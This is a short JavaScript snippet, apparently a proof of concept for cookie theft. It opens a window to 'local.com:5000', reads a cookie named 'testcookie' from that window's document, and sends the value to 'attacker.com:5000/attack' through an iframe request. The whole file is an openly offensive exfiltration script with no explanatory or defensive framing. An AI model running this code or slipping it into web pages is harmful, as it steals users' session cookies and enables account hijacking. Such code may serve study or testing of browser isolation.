function get_cookie ( doc, cookie_name ) {
  var cookie_string = doc.cookie ;
  if (cookie_string.length != 0) {
    var cookie_value = cookie_string.match ( '(^|;)[\s]*' + cookie_name + '=([^;]*)' );
    return decodeURIComponent ( cookie_value[2] ) ;
  }
  return '' ;
}

var windowReference = window.open('http://local.com:5000', 'newindow');
var caputuredCookie = get_cookie(windowReference.document, 'testcookie');
var requrl = "http://attacker.com:5000/attack?cookie=" + caputuredCookie;
console.log(requrl);

var ifrm = windowReference.document.createElement("iframe");
ifrm.setAttribute("src", requrl);
ifrm.style.width = "640px";
ifrm.style.height = "480px";
document.body.appendChild(ifrm);
